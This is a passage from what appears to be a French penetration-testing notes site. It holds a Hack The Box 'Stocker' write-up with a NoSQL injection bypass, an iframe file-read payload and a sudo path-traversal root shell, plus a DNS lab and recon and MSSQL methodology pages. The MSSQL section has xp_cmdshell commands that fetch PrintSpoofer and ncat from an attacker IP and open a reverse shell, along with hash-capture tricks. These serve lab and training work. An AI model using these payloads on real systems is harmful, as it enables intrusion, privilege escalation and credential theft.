http://stocker.htb\n[+] Method:          GET\n[+] Threads:         10\n[+] Wordlist:        /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] User Agent:      gobuster/3.4\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\n2023/02/06 23:13:46 Starting gobuster in VHOST enumeration mode\n===============================================================\nFound: dev.stocker.htb Status: 302 [Size: 28] [--&gt; /login]\nProgress: 10409 / 220561 (4.72%)^C\n[!] Keyboard interrupt detected, terminating.\n\n===============================================================\n2023/02/06 23:14:15 Finished\n</code></pre> <p>vhost trouv\u00e9 via vhost enumeration : dev.stocker.htb</p> <p>Bypass de l'authent avec au format JSON une NoSQL injection :</p> <pre><code>POST /login HTTP/1.1\nHost: dev.stocker.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nContent-Length: 54\nOrigin: http://dev.stocker.htb\nConnection: close\nReferer: http://dev.stocker.htb/login \nCookie: connect.sid=s%3AFhbvDc7SEo_kF1-Bq2JuLGxucLWMeG5V.8UeivYzWZ%2BTMk30M8JbOTskUP1MWxYSf6%2BW3My5HcCo\nUpgrade-Insecure-Requests: 1\n\n{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n</code></pre> <p>Tentative de SSTI avec ${7*7} et</p> <p>Brute force du username : angoose</p> <p>Brute force du password : b3e795719e2a644f69838a593dd159ac</p> <p>\"$;|^{{}}''\"</p> <p>{\"_id\":\"638f116eeb060210cbd83a93\",\"title\":\"Toilet Paper\",\"description\":\"It's toilet paper.\",\"image\":\"toilet-paper.jpg\",\"price\":0.69,\"currentStock\":4212,\"__v\":0}</p> <p>user length : 7  angoose</p> <p>password length : 32 chars</p> <p>il y a un endpoint /api/products</p> <pre><code>                        /api/po/\n</code></pre> <ul> <li>il y a peut \u00eatre d'autre endpoint en 2 chars ??</li> <li>revoir si on ne peut pas ajouter un product ou en modifier 1 ???</li> <li>pour peut \u00eatre faire une SSTI ou LFI (via l'image) ?</li> <li>Voir \u00e0 rebruteforcer et lister les bad chars (status  != 302)<ul> <li>voir ce qu'on pourra\u00eet faire avec ca ...?                 ------------------ SSFI :</li> </ul> </li> </ul> <pre><code>POST /api/order HTTP/1.1\n\nHost: dev.stocker.htb\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\nAccept: */*\n\nAccept-Language: en-US,en;q=0.5\n\nAccept-Encoding: gzip, deflate\n\nReferer: http://dev.stocker.htb/stock\n\nContent-Type: application/json\n\nOrigin: http://dev.stocker.htb\n\nContent-Length: 214\n\nConnection: close\n\nCookie: connect.sid=s%3Avl0rPp-i53IWRGNVdk7aCDRGnBn-yuyG.InPe1bsghz6TrAW2SEdKTwYuWY%2FTpy0bRLDr3Dh5jME\n\n\n\n{\"basket\":[{\"_id\":\"638f116eeb060210cbd83a8d\",\"title\":\"&lt;iframe src=/etc/passwd height=900 width=500&gt;&lt;/iframe&gt;\",\"description\":\"It's a red cup.\",\"image\":\"red-cup.jpg\",\"price\":32,\"currentStock\":4,\"__v\":0,\"amount\":1}]}\n</code></pre> <p>password : IHeardPassphrasesArePrettySecure (from /var/www/dev/index.js)</p> <p>privesc</p> <pre><code>Matching Defaults entries for angoose on stocker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser angoose may run the following commands on stocker:\n    (ALL) /usr/bin/node /usr/local/scripts/*.js\n</code></pre> <p>using sudo path traversal</p> <pre><code># cat /tmp/rebrec/shell.js\nconst { spawn } = require('child_process')\nconst shell = spawn('sh',[], { stdio: 'inherit' })\nshell.on('close',(code)=&gt;{console.log('[shell] terminated :',code)})\n</code></pre> <pre><code>```sudo /usr/bin/node /usr/local/scripts/../../../../../tmp/rebrec/shell.js\n</code></pre>"},{"location":"Labs/DNS%20server/DNS%20Server/","title":"DNS Server","text":"<p>Basic DNS setup in a docker container to test your DNS enumeration tools for instance.</p>"},{"location":"Labs/DNS%20server/DNS%20Server/#initial-setup","title":"Initial Setup","text":"<pre><code>export DOMAIN=rebrec.local\nmkdir dns_lab \ncd $_\n\ncat &lt;&lt; EOF &gt; named.conf.local\nzone \"$DOMAIN\" {\n    type master;\n    file \"/etc/bind/db.$DOMAIN\";\n};\nEOF\n\ncat &lt;&lt; EOF &gt; db.$DOMAIN\n\\$TTL    1d ; default expiration time (in seconds) of all RRs without their own TTL value\n@       IN      SOA     ns1.$DOMAIN. root.$DOMAIN. (\n                  3      ; Serial\n                  1d     ; Refresh\n                  1h     ; Retry\n                  1w     ; Expire\n                  1h )   ; Negative Cache TTL\n\n; name servers - NS records\n     IN      NS      ns1.$DOMAIN.\n\n; name servers - A records\nns1.$DOMAIN.        IN      A     127.0.0.1\nwww.$DOMAIN.        IN      A     172.24.0.3\nwww2.$DOMAIN.       IN      CNAME www\nwww1.$DOMAIN.       IN      TXT   \"Some Text !\"\n\nEOF\n</code></pre>"},{"location":"Labs/DNS%20server/DNS%20Server/#edit-dns-entries","title":"Edit DNS entries","text":"<p>Edit <code>db.$DOMAIN</code> file with your favorite text editor</p>"},{"location":"Labs/DNS%20server/DNS%20Server/#run-the-dns-server","title":"Run the DNS server","text":"<pre><code>sudo docker run --name lab_bind --rm  -v $PWD/db.$DOMAIN:/etc/bind/db.$DOMAIN -v $PWD/named.conf.local:/etc/bind/named.conf.local --expose 53 -ti ubuntu/bind9 \n</code></pre>"},{"location":"Labs/DNS%20server/DNS%20Server/#test-the-dns-setup","title":"Test the DNS setup","text":"<p>In another terminal run the following :</p> <pre><code># Store the container's IP address\nexport TARGET_IP=$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' lab_bind) \n\n\n# Test Name resolution\nhost -t any www1.$DOMAIN $TARGET_IP\n</code></pre>"},{"location":"Labs/DNS%20server/DNS%20Server/#play-around","title":"Play around","text":"<p>You can then use your favorite DNS enumeration tools again the server <code>$TARGET_IP</code></p>"},{"location":"_Environnement/Programmation%20CSharp/Installation%20d%27un%20environnement%20de%20d%C3%A9veloppement%20CSharp/","title":"Installation d'un environnement de d\u00e9veloppement CSharp","text":"<p>Il est parfois utile pour faire des tests sur des challenges n\u00e9cessitant des comp\u00e9tences en d\u00e9veloppement .NET de disposer d'un environnement de d\u00e9veloppement .NET</p> <p>Plusieurs solutions existent sous Windows et sous Linux.</p> <p>Nous mettrons en place ici un environnement de d\u00e9veloppement sous Windows</p> <p>La documentation pr\u00e9sente ici explique comment faire :</p> <p>Apr\u00e8s avoir install\u00e9 le Net 7.0 SDK et l'extension Microsoft C# pour VSCode Lancer dans le dossier o\u00f9 l'on veut cr\u00e9er une application la commande suivante :</p> <pre><code>dotnet new console --framework net7.0\n</code></pre> <p>Si un message d'erreur indique que le .Net framework n'est pas install\u00e9, v\u00e9rifier s'il n'y a pas 2 versions d'install\u00e9es (une dans program files et une dans program files(x86)) et, le cas \u00e9ch\u00e9ant, modifier l'ordre de recherche du PATH</p> <p>Relancer les applications / terminaux pour que la modification prenne effet.</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Collecte%20d%27informations%20Wifi/","title":"Collecte d'informations Wifi","text":"<p>Si on connait l'emplacement g\u00e9ographique de l'entreprise, on peut aller consulter les sites suivants :</p> <ul> <li> <p>Wifimap.io : qui permet \u00e0 des utilisateurs de s'\u00e9changer les SSID et cl\u00e9 Wifi pr\u00e9sentes dans leur smartphone. Si on cr\u00e9e un compte depuis un smartphone (ATTENTION A NE PAS VOIR DE CLE WIFI D'ENREGISTREE DESSUS !!!!) on peut visionner les cl\u00e9 associ\u00e9es aux diff\u00e9rents SSID</p> </li> <li> <p>wigle.net : qui liste les SSID identifi\u00e9s lors de campagnes de war driving</p> </li> </ul>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Employ%C3%A9s/","title":"Employ\u00e9s","text":"<p>linkedin</p> <p>xing</p> <p>offres d'emploi</p> <p>A partir des offres d'emploi, on peut d\u00e9terminer potentiellement :</p> <ul> <li>les languages de programmation utilis\u00e9s</li> <li>les types de services utilis\u00e9s (PostgreSQL, etc)</li> </ul> <p>REST APIs, Github, SVN, and Perforce</p> <p>==&gt; Rechercher ensuite  les mauvaises configuration</p> <pre><code>exemple : si DJANGO est utilis\u00e9 (demand\u00e9 dans les offres d'emploi), on pourra chercher : \"DJANGO MISCONFIGURATION\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Employ%C3%A9s/#comptes-utilisateurs","title":"Comptes utilisateurs","text":"<p>On peut chercher sur les r\u00e9seaux sociaux et google pour des adresses email \"@domain.tld\"</p> <p>On peut \u00e9galement chercher des documents (filetype:pdf, etc.) dans un moteur de recherche au nom de la companie. Il peut arriver que le champs \"Auteur\" des documents contiennent le nom de l'utilisateur AD</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Employ%C3%A9s/#generation-dune-liste-dutilisateurs","title":"G\u00e9n\u00e9ration d'une liste d'utilisateurs","text":"<p>On peut, \u00e0 partir d'une liste d'employ\u00e9s g\u00e9n\u00e9rer une liste de compte potentiels (voir [[G\u00e9n\u00e9rer une Wordlist]]) bas\u00e9 sur des conventions de nommages souvent appliqu\u00e9es (si on n'a pas r\u00e9ussi \u00e0 la d\u00e9terminer)</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Employ%C3%A9s/#outil-linkedin2username","title":"Outil : LinkedIn2Username","text":"<p>https://github.com/initstring/linkedin2username</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Enumeration%20des%20domaines/","title":"Enumeration des domaines","text":"<ul> <li>V\u00e9rifier les certificats SSL : chercher d'\u00e9ventuels noms de domaines alternatifs</li> <li>R\u00e9cup\u00e9rer les sous domaines connus de https://crt.sh/<ul> <li><code>curl -s \"https://crt.sh/?q=inlanefreight.com&amp;output=json\" | jq .</code></li> <li>Domaines uniques : <code>curl -s \"https://crt.sh/?q=inlanefreight.com&amp;output=json\" | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u | tee subdomainlist</code></li> </ul> </li> <li>D\u00e9terminer la liste des IP :<ul> <li><code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done</code></li> <li><code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done | cut -d \" \" -f2 | sort -u | tee ip-addresses.txt</code></li> </ul> </li> <li>Voir les informations de ces hotes dans shodan :<ul> <li><code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code></li> </ul> </li> <li>R\u00e9cup\u00e9ration des enregistrements DNS disponibles :<ul> <li><code>dig any inlanefreight.com</code></li> </ul> </li> <li>R\u00e9cup\u00e9ration d'autres adresses<ul> <li><code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done</code></li> </ul> </li> </ul>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Enumeration%20des%20domaines/#ressources-cloud","title":"Ressources Cloud","text":"<p>AWS : requ\u00eate google <code>intext:&lt;company|domain&gt; inurl:amazonaws.com</code></p> <p>Azure : requ\u00eate google <code>intext:&lt;company|domain&gt; inurl:blob.core.windows.net</code></p> <p>domain.glass</p> <p>GrayHatWarfare</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Whois/","title":"Whois","text":"<p>On peut r\u00e9cup\u00e9rer des informations concernant :</p> <ul> <li>L'entreprise</li> <li>Les administrateurs</li> <li>Des adresses email</li> <li>Les serveurs de noms</li> </ul> <pre><code>export TARGET=\"facebook.com\"\nwhois $TARGET\n</code></pre> <p>La commande <code>whois.exe</code> r\u00e9alise la m\u00eame op\u00e9ration sous Windows</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Collecte%20de%20domaines%20et%20addresses%20IP/Certificats/","title":"Certificats","text":"<p>Il est recommand\u00e9 d'aller regarder sur les sites suivants le domaine et les IP dans le p\u00e9rim\u00e8tre de l'audit :</p> <ul> <li>https://crt.sh/</li> <li>https://search.censys.io/certificates (n\u00e9cessite de cr\u00e9er un compte)</li> </ul> <p>On peut collecter ces informations de la mani\u00e8re suivante :</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Collecte%20de%20domaines%20et%20addresses%20IP/Certificats/#curl","title":"Curl","text":"<pre><code>export TARGET=\"facebook.com\"\ncurl -s \"https://crt.sh/?q=${TARGET}&amp;output=json\" | jq -r '.[] | \"\\(.name_value)\\n\\(.common_name)\"' | sort -u &gt; \"${TARGET}_crt.sh.txt\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Collecte%20de%20domaines%20et%20addresses%20IP/Certificats/#openssl","title":"OpenSSL","text":"<pre><code>openssl s_client -ign_eof 2&gt;/dev/null &lt;&lt;&lt;$'HEAD / HTTP/1.0\\r\\n\\r' -connect \"${TARGET}:${PORT}\" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\\n|g' -e 's|^\\*.*||g' | tr -d ',' | sort -u\n</code></pre>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Collecte%20de%20domaines%20et%20addresses%20IP/Certificats/#version-automatisee-theharvester","title":"Version Automatis\u00e9e : TheHarvester","text":"<pre><code>cat sources.txt\n\nbaidu\nbufferoverun\ncrtsh\nhackertarget\notx\nprojecdiscovery\nrapiddns\nsublist3r\nthreatcrowd\ntrello\nurlscan\nvhost\nvirustotal\nzoomeye\n\nexport TARGET=\"facebook.com\"\ncat sources.txt | while read source; do theHarvester -d \"${TARGET}\" -b $source -f \"${source}_${TARGET}\";done\n\n# extraction des domaines\ncat *.json | jq -r '.hosts[]' 2&gt;/dev/null | cut -d':' -f 1 | sort -u &gt; \"${TARGET}_theHarvester.txt\"\n\n# consolidation des donn\u00e9es collect\u00e9es \ncat facebook.com_*.txt | sort -u &gt; facebook.com_subdomains_passive.txt\ncat facebook.com_subdomains_passive.txt | wc -l\n</code></pre>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Collecte%20de%20domaines%20et%20addresses%20IP/Infrastructure/","title":"Infrastructure","text":"<p><code>https://sitereport.netcraft.com</code></p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Collecte%20de%20domaines%20et%20addresses%20IP/Infrastructure/#wayback-machine","title":"Wayback Machine","text":"<p>Les archives de site pr\u00e9sentes sur http://web.archive.org/ peuvent permettre de trouver des versions anciennes d'une application Web, pouvant r\u00e9v\u00e9ler des informations qui ont depuis \u00e9t\u00e9 nettoy\u00e9es (commentaires, etc.)</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Collecte%20de%20domaines%20et%20addresses%20IP/Infrastructure/#waybackurls","title":"WaybackUrls","text":"<pre><code># installation \ngo install github.com/tomnomnom/waybackurls@latest\n\n# utilisation\nwaybackurls -dates https://facebook.com &gt; waybackurls.txt\n</code></pre>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/1-Passive/Externe/Collecte%20de%20domaines%20et%20addresses%20IP/Virus%20Total/","title":"Virus Total","text":"<p>On peut trouver des liens depuis https://www.virustotal.com/</p> <p>On saisie le nom de domaine dans l'onglet <code>SEARCH</code></p> <p>Puis on regarde l'onglet <code>Relations</code> dans les r\u00e9sultats</p> <p>![[Virus Total-1.png]]</p> <p>On peut \u00e9galement trouver des historiques d'enregistrements WHOIS qui peuvent donner des informations int\u00e9ressantes qui auraient \u00e9t\u00e9 nettoy\u00e9es.</p> <p>Il en est de m\u00eame concernant les anciens certificats SSL</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/2-Active/Enum%C3%A9ration%20de%20VHOSTS/","title":"Enum\u00e9ration de VHOSTS","text":"<p>public: true</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/2-Active/Enum%C3%A9ration%20de%20VHOSTS/#tags-vhost-hashes-lfi-password-spraying-potato","title":"Tags: vhost, hashes, lfi, password-spraying, potato","text":""},{"location":"_M%C3%A9thodologie/0-Reconnaissance/2-Active/Enum%C3%A9ration%20des%20sous%20domaines/","title":"Enum\u00e9ration des sous domaines","text":"<p>[[docs/_M\u00e9thodologie/1-Enum\u00e9ration/Services/DNS]]</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/2-Active/Web/","title":"Web","text":""},{"location":"_M%C3%A9thodologie/0-Reconnaissance/2-Active/Web/#en-tetes-http","title":"En-t\u00eates HTTP","text":"<pre><code>curl -I \"https://${TARGET}\"\n\nHTTP/1.1 200 OK\nDate: Thu, 23 Sep 2021 15:10:42 GMT\nServer: Apache/2.4.25 (Debian)\nX-Powered-By: PHP/7.3.5\nLink: &lt;http://192.168.10.10/wp-json/&gt;; rel=\"https://api.w.org/\"\nContent-Type: text/html; charset=UTF-8\n</code></pre>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/2-Active/Web/#whatweb","title":"WhatWeb","text":"<pre><code>whatweb -a3 https://www.facebook.com -v\n</code></pre>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/2-Active/Web/#wappalyzer","title":"Wappalyzer","text":"<p>L'installation de cette extension de navigateur permet d'obtenir un rapide aper\u00e7u des technologies utilis\u00e9es sur un site web.</p>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/2-Active/Web/#identification-dun-waf","title":"Identification d'un WAF","text":"<p>Un Firewall applicatif peut parfois \u00eatre identifi\u00e9 via l'utilitaire <code>wafw00f</code></p> <pre><code># installation\nsudo apt install wafw00f -y\n\n# utilisation\nwafw00f -v https://www.tesla.com\n</code></pre>"},{"location":"_M%C3%A9thodologie/0-Reconnaissance/2-Active/Web/#obtenir-des-capture-decran-dune-liste-de-site-web","title":"Obtenir des capture d'\u00e9cran d'une liste de site web","text":"<p>Pour obtenir un appercu d'une liste de sites, on peut utiliser `aquatone</p> <p>[[Aquatone]]</p> <pre><code># installation \nsudo apt install golang chromium-driver\ngo get github.com/michenriksen/aquatone\nexport PATH=\"$PATH\":\"$HOME/go/bin\"\n\n# utilisation\ncat facebook_aquatone.txt | aquatone -out ./aquatone -screenshot-timeout 1000\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/","title":"MSSQL (SQL Server)","text":"<p>Port : 1433</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#enumeration","title":"Enumeration","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#sans-acces-initial","title":"Sans acc\u00e8s initial","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#nmap","title":"nmap","text":"<pre><code>sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args &lt;mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $TARGET_IP\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#metasploit","title":"metasploit","text":"<pre><code>msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts 10.129.201.248\n\nrhosts =&gt; 10.129.201.248\n\n\nmsf6 auxiliary(scanner/mssql/mssql_ping) &gt; run\n\n[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:\n[+] 10.129.201.248:       -    ServerName      = SQL-01\n[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER\n[+] 10.129.201.248:       -    IsClustered     = No\n[+] 10.129.201.248:       -    Version         = 15.0.2000.5\n[+] 10.129.201.248:       -    tcp             = 1433\n[+] 10.129.201.248:       -    np              = \\\\SQL-01\\pipe\\sql\\query\n[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#avec-acces","title":"Avec acc\u00e8s","text":"<p>Si on dispose d'un acc\u00e8s via un des outils pr\u00e9sent\u00e9s plus bas sur cette page, on pourra utiliser les commandes suivantes pour d\u00e9couvrir l'environnement de base de donn\u00e9es accessible.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#requetes-utiles","title":"Requ\u00eates utiles","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#informations-generales","title":"Informations g\u00e9n\u00e9rales","text":"<pre><code>-- Get version\nselect @@version;\n-- Get user\nselect user_name();\nselect SYSTEM_USER;\n-- List admin users\nselect name,type_desc,is_disabled FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name;\n-- Check if we are sysadmin\nSELECT IS_SRVROLEMEMBER('sysadmin'); -- retourne 0 si nous ne sommes pas membre\n--\n-- List users\nselect sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;\n\n-- List users that current user can impersonate \n--    if found : we need to impersonate each user available and enumerate again (see Exploitation below to see how to impersonate)\nSELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';\n\n\n-- List Linked servers\nSELECT srvname, isremote FROM sysservers WHERE isremote = 0; -- 0 means linked server\nEXEC sp_linkedservers\nSELECT * FROM sys.servers;\nSELECT name,is_linked,is_remote_login_enabled, FROM sys.servers WHERE isremote = 0; -- 0 means linked server\n</code></pre> <p>Si un serveur li\u00e9 (Linked Server) est d\u00e9couvert, on pourra tenter d'y acc\u00e9der, v\u00e9rifier si nous disposons de privil\u00e8ges diff\u00e9rents sur celui-ci. Voir la partie <code>Exploitation</code> plus bas sur cette page.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#exploration-de-linstance-de-base-de-donnee","title":"Exploration de l'instance de base de donn\u00e9e","text":"<pre><code>-- Get databases\nselect name from sys.databases;\nSELECT name FROM master.dbo.sysdatabases;\n\n-- Use database\nUSE master;\n\n-- Get table names\nSELECT table_name FROM &lt;databaseName&gt;.INFORMATION_SCHEMA.TABLES;\nSELECT table_name FROM INFORMATION_SCHEMA.TABLES; -- si use DBXXX\n-- Get columns for table\nSELECT COLUMN_NAME FROM &lt;databaseName&gt;.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MYTABLE';\nSELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MYTABLE';; -- si use DBXXX\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#outils-utiles","title":"Outils utiles","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#windows","title":"Windows","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#sqlcmd","title":"sqlcmd","text":"<p>Utilitaire installer avec SQLServer</p> <p>Il faudra ajouter le mot cl\u00e9 <code>GO</code> \u00e0 chaque requ\u00eate afin qu'elle soit ex\u00e9cut\u00e9e.</p> <p>Attention il peut peyt \u00eatre utils d'utiliser le parametre <code>-y 0</code> pour obtenir des enregistrements complets lors de l'ex\u00e9cution des requ\u00eate. Sinon on n'obtient des r\u00e9sultats qui semblent \"tronqu\u00e9s\"</p> <pre><code># -y 30 -Y 30 augmentent la visibilit\u00e9 des r\u00e9sultat (attention aux performances)\nsqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30\n# port non standard\nsqlcmd -S \"127.0.0.1,49730\" -U MyDNNUser -P 'MyDNNS3cure'\n# ATTENTION : cet utilitaire n\u00e9cessite la saisie du mot GO \u00e0 la ligne terminant chaque requ\u00eate ! (pas besoin de ';' dans cet outil)\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#linux","title":"Linux","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#sqsh","title":"sqsh","text":"<p>Equivalent de sqlcmd sous Windows, pour Linux.</p> <p>Comme sous windows, on ajoutera le mot cl\u00e9 <code>GO</code> \u00e0 chaque requ\u00eate afin qu'elle soit ex\u00e9cut\u00e9e.</p> <pre><code># Authentificatino Interne (SQL Server)\nsqsh -S $TARGET_IP -U $AD_USER -P $AD_PASSWORD\n\n# Authentification locale ou domaine\nsqsh -S $TARGET_IP -U .\\\\$AD_USER -P $AD_PASSWORD \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#mssqlclientpy-impacket","title":"Mssqlclient.py (impacket)","text":"<p>Attention : ce client n'accepte pas les requ\u00eates sur plusieurs lignes.</p> <pre><code># Internal Authentication (no fomzin prefix)\nmssqlclient.py -p 1433  $USER:$PASS@$TARGET_IP \n\n# Local workstation authentication \nmssqlclient.py Administrator@10.129.201.248 -windows-auth\n\n# Local workstation account authentication (no need to add WIN-02 to hosts)\nmssqlclient.py -p 1433 -windows-auth $AD_DOMAIN$/$AD_USER:\"$AD_PASSWORD\"@$TARGET_IP\n\nSQL&gt; enable_xp_cmdshell\nSQL&gt; xp_cmdshell whoami /priv\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#commandes-utiles","title":"Commandes utiles","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#exploitation","title":"Exploitation","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#execution-de-commandes-xp_cmdshell","title":"Ex\u00e9cution de commandes (xp_cmdshell)","text":"<pre><code>-- Depuis l'outil Impacket mssqlclient.py\nenable_xp_cmdshell -- rien d'autre \u00e0 taper normalement, la reconfiguration se fait automatiquement\n\n------------------------------------------------------------------------\n-- Tentative d activation de xp_cmdshell  (si droits suffisants)\n-- Allow advanced options to be changed.  \nEXECUTE sp_configure 'show advanced options', 1;\nRECONFIGURE;\n\n-- To enable the feature.  \nEXECUTE sp_configure 'xp_cmdshell', 1;\nRECONFIGURE\n\n--  Execution de commande (after enabling it)\nxp_cmdshell whoami\nxp_cmdshell whoami /priv\nxp_cmdshell \"powershell iwr http://10.10.14.145:8000/PrintSpoofer64.exe -o c:\\windows\\temp\\PrintSpoofer.exe\";\nxp_cmdshell \"powershell iwr http://10.10.14.145:8000/ncat.exe -o c:\\windows\\temp\\ncat.exe\";\nxp_cmdshell c:\\windows\\temp\\PrintSpoofer.exe -c \"c:\\windows\\temp\\ncat.exe 10.10.14.145 1337 -e cmd\";\nxp_cmdshell \"powershell iwr http://x.x.x.x/ncat.exe -o $($env:Temp)\\ncat.exe\";\n\nxp_cmdshell powershell -e &lt;hoaxshell payload&gt;;\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#capture-de-hash","title":"Capture de Hash","text":"<pre><code>-- XP_DIRTREE\nEXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'\n</code></pre> <pre><code>-- XP_SUBDIRS\nEXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#ecriture-dans-un-fichier","title":"Ecriture dans un fichier","text":"<pre><code>------------------------------------------------------------------------\n-- Creation de fichier via OLE Automation Procedures\n\n-- Activation\nsp_configure 'show advanced options', 1\nRECONFIGURE\nsp_configure 'Ole Automation Procedures', 1\nRECONFIGURE\n\n-- Cr\u00e9ation de fichier\nDECLARE @OLE INT\nDECLARE @FileID INT\nEXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\nEXECUTE sp_OAMethod @OLE, 